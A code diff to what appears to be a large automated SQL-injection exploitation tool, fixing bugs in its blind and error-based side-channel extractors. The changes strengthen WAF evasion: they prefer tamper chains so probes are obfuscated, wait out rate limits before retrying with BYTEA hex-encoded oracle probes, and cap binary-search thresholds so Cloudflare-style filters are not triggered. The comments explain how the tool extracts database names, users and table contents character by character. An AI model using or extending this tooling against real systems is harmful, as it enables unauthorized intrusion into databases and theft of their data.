@@ -63649,7 +63649,17 @@ class Scanner:
                               "equaltolike","unicodeencode","utf8encode","htmlencode_all",
                               "tripleurlencode",
                           "json_unicode_escape","hex_entities","unicode_fullwidth"}
-            _tc_raw = getattr(self, "_tamper_chain", []) or []
+            # BUG-SCE-WHERE-ERROR-EMPTY-TAMPER: self._tamper_chain is the extractor-class
+            # attribute, which may be empty or absent when extraction runs via the first
+            # code path. enum.tamper_chain (set from DetectionResult.tamper_chain by
+            # _inference_extract and _run_enumeration_inner augmentation) is the correct
+            # chain. Using self._tamper_chain = [] causes all WHERE-ERROR probes to be
+            # sent unobfuscated, which WAFs block → no signal → "No WHERE-ERROR strategy
+            # viable" even though the oracle is real. Prefer enum.tamper_chain when it is
+            # non-empty; fall back to self._tamper_chain only when enum has none.
+            _tc_raw = (list(enum.tamper_chain)
+                       if hasattr(enum, 'tamper_chain') and enum.tamper_chain
+                       else getattr(self, "_tamper_chain", []) or [])
             _tc = [t for t in _tc_raw if t not in _EXTRACT_STRIP]
             _sce = SideChannelExtractor(
                 engine, cfg, getattr(enum, "result", None),
@@ -111064,8 +111074,8 @@ class TechniqueCascadeEngine:
                 # exact string embedded in the f-string-built payload (e.g. "2.0").
                 # BUG-R3A FIX (Part 2): Use integer half for compute payloads
                 # (BENCHMARK/RANDOMBLOB/GENERATE_SERIES need integer args).
-                _is_int_arg_fb = bool(re.search(
-                    r'BENCHMARK|RANDOMBLOB|GENERATE_SERIES|WAITFOR', _bt, re.IGNORECASE))
+                _is_int_arg_fb = bool(_re.search(  # BUG-INLINE-RE-IMPORT-FIX: was bare re.search
+                    r'BENCHMARK|RANDOMBLOB|GENERATE_SERIES|WAITFOR', _bt, _re.IGNORECASE))
                 _half_sleep_raw = max(0.05, _sleep_sec / 2.0)  # BUG-CHECKB-HALF-SLEEP-FLOOR FIX:
                 # Old floor was max(0.5, ...) — for pg_sleep(0.1) this produced a "half-sleep"
                 # of 0.5s (5× the original!). The proportionality check then required
@@ -134648,7 +134658,7 @@ class MultiStrategyExtractor:
                         is_true = await self.eval_condition(cond)  # fallback
                 except Exception:
                     oracle_fails[_oracle] = oracle_fails.get(_oracle, 0) + 1
-                    is_true = False
+                    is_true = await self.eval_condition(cond)  # BUG-MSE-HOTSWTCH-EXCEPT FIX: was False, biasing binary search downward on WAF/timeout
             else:
                 is_true = await self.eval_condition(cond)
 
@@ -134862,7 +134872,7 @@ class MultiStrategyExtractor:
             ch = await self._charset_binary_search(expr, prefix, oracle_fails)
             return ch or ""
         except Exception as e:
-            return ""
+            return e  # BUG-MSE-SINGLEPOS-SWALLOW FIX: was ""; caller checks isinstance(br, Exception) and logs; "" was silently truncating output
 
     # 
     # ENHANCED extract_from_table with all improvements
@@ -136006,12 +136016,39 @@ class SideChannelExtractor:
                             return ""
                         # sanity passes via real conditions and BYTEA verified; continue to extraction
                     else:
+                        # BUG-SCE-SANITY-WAF-RATELIMIT: When both primary (1>0/1>2) and
+                        # retry (current_user>='!'/zzzzz) sanity probes fail, the WAF may
+                        # be rate-limiting all SQL patterns after heavy Novel-bypass traffic
+                        # (30+ requests). The oracle IS valid but the WAF rate window hasn't
+                        # reset yet. A brief cooldown allows the rate limiter to recover.
+                        # Try BYTEA probes after 15s: threshold=33 ('!') uses decode('21','hex')
+                        # and threshold=65534 uses decode('efbfbe','hex') — 1-3 byte hex
+                        # patterns less likely to trigger pattern-match than 4-byte sequences.
+                        # If BYTEA verification passes, proceed in WAF-bypass ordinal mode.
                         print(f"[SideChannel] Oracle sanity FAILED "
                               f"(primary: 1>0→{_san_true}, 1>2→{_san_false}; "
                               f"retry: current_user>='!'→{_san_rt}, "
                               f"current_user>='zzzzz'→{_san_rf})"
-                              f" — aborting extraction for: {expr[:50]}", flush=True)
-                        return ""
+                              f" — WAF may be rate-limiting; cooling 15s then trying BYTEA",
+                              flush=True)
+                        await asyncio.sleep(15.0)
+                        _bv2_true = await self.eval_where_error(
+                            self._char_ord_cond(expr, 1, 33, True),
+                            random.randint(100000, 999999))
+                        await asyncio.sleep(1.0)
+                        _bv2_false = await self.eval_where_error(
+                            self._char_ord_cond(expr, 1, 65534, True),
+                            random.randint(100000, 999999))
+                        if _bv2_true is True and _bv2_false is False:
+                            print(f"[SideChannel] BYTEA sanity OK after cooldown — "
+                                  f"proceeding in WAF-bypass ordinal mode", flush=True)
+                            self._we_ordinal_blocked = True
+                            self._we_bytea_ok = True
+                        else:
+                            print(f"[SideChannel] Oracle sanity abandoned after cooldown "
+                                  f"(BYTEA: {_bv2_true}/{_bv2_false}) — aborting: {expr[:50]}",
+                                  flush=True)
+                            return ""
                 except Exception as _san_retry_ex:
                     print(f"[SideChannel] Oracle sanity retry raised {_san_retry_ex!r} "
                           f"— aborting extraction", flush=True)
@@ -136035,6 +136072,19 @@ class SideChannelExtractor:
                                "SQLite", "PostgreSQL", "CockroachDB", "YugabyteDB",
                                "Amazon Redshift", "MySQL", "MariaDB", "TiDB")
                            else 255)
+        # BUG-SCE-BYTEA-BSEARCH-CEILING: In BYTEA bypass mode (_we_ordinal_blocked=True),
+        # _char_ord_cond encodes the threshold as UTF-8 hex (e.g. threshold=557055 →
+        # decode('f2888197','hex')). Cloudflare and other WAFs pattern-match 4-byte UTF-8
+        # hex sequences as suspicious byte patterns and return a WAF block page whose
+        # size matches err_len (557B). eval_where_error returns True for all WAF-blocked
+        # probes → binary search converges to a mid-range garbage Unicode codepoint
+        # (observed: U+4D87A, U+BADE7) instead of the real ASCII character.
+        # Database names, usernames, and all SQL identifiers are always 7-bit ASCII
+        # (0–127). Limiting the ceiling to 127 in BYTEA mode prevents probing the
+        # high-Unicode range where WAFs trigger on the 3–4 byte hex encoding, and
+        # makes the stuck-oracle guard probe at 126 ('~') which WAFs always allow.
+        if self._we_ordinal_blocked:
+            _sce_we_char_hi = 127
         # BUG-SCE-EXTWERR-LO-INIT FIX (v66): prefix-comparison binary search with lo=32
         # and `if lo < 32: break` guard misses EOS (32 < 32 = False) → trailing spaces
         # accumulate until max_len. Fix: space-streak counter (same as extract_from_table).
@@ -136192,6 +136242,15 @@ class SideChannelExtractor:
                                "SQLite", "PostgreSQL", "CockroachDB", "YugabyteDB",
                                "Amazon Redshift", "MySQL", "MariaDB", "TiDB")
                            else 255)
+        # BUG-SCE-BYTEA-BSEARCH-CEILING (extract_table_column): same root cause as
+        # extract_where_error. BYTEA hex encoding of thresholds above 127 produces
+        # 2–4 byte UTF-8 patterns (e.g. decode('f2888197','hex')) that WAFs block,
+        # returning err_len-sized pages → eval_where_error returns True for every
+        # high-threshold probe → binary search converges to garbage Unicode. All
+        # SQL column values extracted via this path (table names, column names,
+        # data values in schema enum) are ASCII identifiers ≤ 127. Cap at 127.
+        if self._we_ordinal_blocked:
+            _sce_tc_char_hi = 127
         # BUG-SCE-EXTTBLCOL-LO-INIT FIX (v66): same space-streak EOS fix as extract_where_error.
         _sce_tc_space_streak = 0
         # BUG-SCE-EXTTBLCOL-NO-CONSECUTIVE-FAIL FIX (MEDIUM, all 5 DBMSes, WHERE-ERROR
